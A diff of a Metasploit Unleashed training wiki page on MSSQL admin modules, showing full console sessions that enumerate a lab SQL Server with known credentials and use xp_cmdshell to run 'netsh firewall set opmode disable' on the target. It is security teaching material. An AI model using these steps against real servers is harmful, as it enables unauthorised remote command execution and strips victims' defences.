@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Admin MSSQL Auxiliary Modules - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Admin_MSSQL_Auxiliary_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Admin_MSSQL_Auxiliary_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Admin_MSSQL_Auxiliary_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Admin_MSSQL_Auxiliary_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,343 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Admin MSSQL Auxiliary Modules</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Admin_MSSQL_Auxiliary_Modules#column-one">navigation</a>, <a href="Admin_MSSQL_Auxiliary_Modules#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Admin_MSSQL_Auxiliary_Modules#mssql_enum"><span class="tocnumber">1</span> <span class="toctext">mssql_enum</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Admin_MSSQL_Auxiliary_Modules#mssql_exec"><span class="tocnumber">2</span> <span class="toctext">mssql_exec</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="mssql_enum"> mssql_enum </span></h2>
+<p>The <b>"mssql_enum"</b> is an admin module that will accept a set of credentials and query a MSSQL for various configuration settings.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/admin/mssql/mssql_enum</span>
+msf auxiliary(<span style='color:#ff0000;'>mssql_enum</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/admin/mssql/mssql_enum):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOST                      yes       The target address
+   RPORT     1433             yes       The target port
+   USERNAME  sa               no        The username to authenticate as</pre>
+<br />
+To configure the module, we accept the default username, set our PASSWORD and RHOST, then let it run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>mssql_enum</span>) > <span style='color:#13C16A;'>set PASSWORD password1</span>
+PASSWORD => password1
+msf auxiliary(<span style='color:#ff0000;'>mssql_enum</span>) > <span style='color:#13C16A;'>set RHOST 192.168.1.195</span>
+RHOST => 192.168.1.195
+msf auxiliary(<span style='color:#ff0000;'>mssql_enum</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Running MS SQL Server Enumeration...
+<span style='color:#0000FF;'>[*]</span> Version:
+<span style='color:#0000FF;'>[*]</span>	Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+<span style='color:#0000FF;'>[*]</span>		Oct 14 2005 00:33:37 
+<span style='color:#0000FF;'>[*]</span>		Copyright (c) 1988-2005 Microsoft Corporation
+<span style='color:#0000FF;'>[*]</span>		Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
+<span style='color:#0000FF;'>[*]</span> Configuration Parameters:
+<span style='color:#0000FF;'>[*]</span> 	C2 Audit Mode is Not Enabled
+<span style='color:#0000FF;'>[*]</span> 	xp_cmdshell is Not Enabled
+<span style='color:#0000FF;'>[*]</span> 	remote access is Enabled
+<span style='color:#0000FF;'>[*]</span> 	allow updates is Not Enabled
+<span style='color:#0000FF;'>[*]</span> 	Database Mail XPs is Not Enabled
+<span style='color:#0000FF;'>[*]</span> 	Ole Automation Procedures are Not Enabled
+<span style='color:#0000FF;'>[*]</span> Databases on the server:
+<span style='color:#0000FF;'>[*]</span> 	Database name:master
+<span style='color:#0000FF;'>[*]</span> 	Database Files for master:
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\mastlog.ldf
+<span style='color:#0000FF;'>[*]</span> 	Database name:tempdb
+<span style='color:#0000FF;'>[*]</span> 	Database Files for tempdb:
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\templog.ldf
+<span style='color:#0000FF;'>[*]</span> 	Database name:model
+<span style='color:#0000FF;'>[*]</span> 	Database Files for model:
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\modellog.ldf
+<span style='color:#0000FF;'>[*]</span> 	Database name:msdb
+<span style='color:#0000FF;'>[*]</span> 	Database Files for msdb:
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf
+<span style='color:#0000FF;'>[*]</span> 		c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBLog.ldf
+<span style='color:#0000FF;'>[*]</span> System Logins on this Server:
+<span style='color:#0000FF;'>[*]</span> 	sa
+<span style='color:#0000FF;'>[*]</span> 	##MS_SQLResourceSigningCertificate##
+<span style='color:#0000FF;'>[*]</span> 	##MS_SQLReplicationSigningCertificate##
+<span style='color:#0000FF;'>[*]</span> 	##MS_SQLAuthenticatorCertificate##
+<span style='color:#0000FF;'>[*]</span> 	##MS_AgentSigningCertificate##
+<span style='color:#0000FF;'>[*]</span> 	BUILTIN\Administrators
+<span style='color:#0000FF;'>[*]</span> 	NT AUTHORITY\SYSTEM
+<span style='color:#0000FF;'>[*]</span> 	V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS
+<span style='color:#0000FF;'>[*]</span> 	BUILTIN\Users
+<span style='color:#0000FF;'>[*]</span> Disabled Accounts:
+<span style='color:#0000FF;'>[*]</span> 	No Disabled Logins Found
+<span style='color:#0000FF;'>[*]</span> No Accounts Policy is set for:
+<span style='color:#0000FF;'>[*]</span> 	All System Accounts have the Windows Account Policy Applied to them.
+<span style='color:#0000FF;'>[*]</span> Password Expiration is not checked for:
+<span style='color:#0000FF;'>[*]</span> 	sa
+<span style='color:#0000FF;'>[*]</span> System Admin Logins on this Server:
+<span style='color:#0000FF;'>[*]</span> 	sa
+<span style='color:#0000FF;'>[*]</span> 	BUILTIN\Administrators
+<span style='color:#0000FF;'>[*]</span> 	NT AUTHORITY\SYSTEM
+<span style='color:#0000FF;'>[*]</span> 	V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS
+<span style='color:#0000FF;'>[*]</span> Windows Logins on this Server:
+<span style='color:#0000FF;'>[*]</span> 	NT AUTHORITY\SYSTEM
+<span style='color:#0000FF;'>[*]</span> Windows Groups that can logins on this Server:
+<span style='color:#0000FF;'>[*]</span> 	BUILTIN\Administrators
+<span style='color:#0000FF;'>[*]</span> 	V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS
+<span style='color:#0000FF;'>[*]</span> 	BUILTIN\Users
+<span style='color:#0000FF;'>[*]</span> Accounts with Username and Password being the same:
+<span style='color:#0000FF;'>[*]</span> 	No Account with its password being the same as its username was found.
+<span style='color:#0000FF;'>[*]</span> Accounts with empty password:
+<span style='color:#0000FF;'>[*]</span> 	No Accounts with empty passwords where found.
+<span style='color:#0000FF;'>[*]</span> Stored Procedures with Public Execute Permission found:
+<span style='color:#0000FF;'>[*]</span> 	sp_replsetsyncstatus
+<span style='color:#0000FF;'>[*]</span> 	sp_replcounters
+<span style='color:#0000FF;'>[*]</span> 	sp_replsendtoqueue
+<span style='color:#0000FF;'>[*]</span> 	sp_resyncexecutesql
+<span style='color:#0000FF;'>[*]</span> 	sp_prepexecrpc
+<span style='color:#0000FF;'>[*]</span> 	sp_repltrans
+<span style='color:#0000FF;'>[*]</span> 	sp_xml_preparedocument
+<span style='color:#0000FF;'>[*]</span> 	xp_qv
+<span style='color:#0000FF;'>[*]</span> 	xp_getnetname
+<span style='color:#0000FF;'>[*]</span> 	sp_releaseschemalock
+<span style='color:#0000FF;'>[*]</span> 	sp_refreshview
+<span style='color:#0000FF;'>[*]</span> 	sp_replcmds
+<span style='color:#0000FF;'>[*]</span> 	sp_unprepare
+<span style='color:#0000FF;'>[*]</span> 	sp_resyncprepare
+<span style='color:#0000FF;'>[*]</span> 	sp_createorphan
+<span style='color:#0000FF;'>[*]</span> 	xp_dirtree
+<span style='color:#0000FF;'>[*]</span> 	sp_replwritetovarbin
+<span style='color:#0000FF;'>[*]</span> 	sp_replsetoriginator
+<span style='color:#0000FF;'>[*]</span> 	sp_xml_removedocument
+<span style='color:#0000FF;'>[*]</span> 	sp_repldone
+<span style='color:#0000FF;'>[*]</span> 	sp_reset_connection
+<span style='color:#0000FF;'>[*]</span> 	xp_fileexist
+<span style='color:#0000FF;'>[*]</span> 	xp_fixeddrives
+<span style='color:#0000FF;'>[*]</span> 	sp_getschemalock
+<span style='color:#0000FF;'>[*]</span> 	sp_prepexec
+<span style='color:#0000FF;'>[*]</span> 	xp_revokelogin
+<span style='color:#0000FF;'>[*]</span> 	sp_resyncuniquetable
+<span style='color:#0000FF;'>[*]</span> 	sp_replflush
+<span style='color:#0000FF;'>[*]</span> 	sp_resyncexecute
+<span style='color:#0000FF;'>[*]</span> 	xp_grantlogin
+<span style='color:#0000FF;'>[*]</span> 	sp_droporphans
+<span style='color:#0000FF;'>[*]</span> 	xp_regread
+<span style='color:#0000FF;'>[*]</span> 	sp_getbindtoken
+<span style='color:#0000FF;'>[*]</span> 	sp_replincrementlsn
+<span style='color:#0000FF;'>[*]</span> Instances found on this server:
+<span style='color:#0000FF;'>[*]</span> 	SQLEXPRESS
+<span style='color:#0000FF;'>[*]</span> Default Server Instance SQL Server Service is running under the privilege of:
+<span style='color:#0000FF;'>[*]</span> 	xp_regread might be disabled in this system
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>mssql_enum</span>) ></pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="mssql_exec"> mssql_exec </span></h2>
+<p>The <b>"mssql_exec"</b> admin module takes advantage of the xp_cmdshell stored procedure to execute commands on the remote system. If you have acquired or guessed MSSQL admin credentials, this can be a very useful module.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/admin/mssql/mssql_exec</span>
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/admin/mssql/mssql_exec):
+
+   Name      Current Setting                       Required  Description
+   ----      ---------------                       --------  -----------
+   CMD       cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
+   PASSWORD                                        no        The password for the specified username
+   RHOST                                           yes       The target address
+   RPORT     1433                                  yes       The target port
+   USERNAME  sa                                    no        The username to authenticate as</pre>
+<br />
+We set our RHOST and PASSWORD values and set the CMD to disable the Windows Firewall on the remote system. This can enable us to potentially exploit other services running on the target.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>set CMD netsh firewall set opmode disable</span>
+CMD => netsh firewall set opmode disable
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>set PASSWORD password1</span>
+PASSWORD => password1
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>set RHOST 192.168.1.195</span>
+RHOST => 192.168.1.195
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> The server may have xp_cmdshell disabled, trying to enable it...
+<span style='color:#0000FF;'>[*]</span> SQL Query: EXEC master..xp_cmdshell 'netsh firewall set opmode disable'
+
+
+
+ output
+ ------
+ Ok.
+ 
+ 
+
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) ></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="http://www.offensive-security.com/w/index.php?title=Module_Reference&amp;action=edit&amp;redlink=1" class="new" title="Module Reference (page does not exist)">Module Reference</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Auxiliary_Modules&amp;action=edit&amp;redlink=1" class="new" title="Auxiliary Modules (page does not exist)">Auxiliary Modules</a> &gt; <a href="Admin_Modules" title="Admin Modules">Admin Modules</a> &gt; Admin MSSQL Auxiliary Modules</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Admin_HTTP_Modules" title="Admin HTTP Modules" class="mw-redirect">Admin HTTP Modules</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Admin_MSSQL_Modules&amp;action=edit&amp;redlink=1" class="new" title="Admin MSSQL Modules (page does not exist)">Admin MSSQL Modules</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Admin_MySQL_Modules&amp;action=edit&amp;redlink=1" class="new" title="Admin MySQL Modules (page does not exist)">Admin MySQL Modules</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Admin_Postgres_Modules&amp;action=edit&amp;redlink=1" class="new" title="Admin Postgres Modules (page does not exist)">Admin Postgres Modules</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 529/1000000
+Preprocessor generated node count: 2681/1000000
+Post‐expand include size: 5036/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:236-0!*!0!!en!*!* and timestamp 20131123163251 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Admin_MSSQL_Auxiliary_Modules&amp;oldid=1239">http://www.offensive-security.com/w/index.php?title=Admin_MSSQL_Auxiliary_Modules&amp;oldid=1239</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Admin_Modules&amp;action=edit&amp;redlink=1" class="new" title="Category:Admin Modules (page does not exist)">Admin Modules</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +828,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.187 secs. --></body></html>
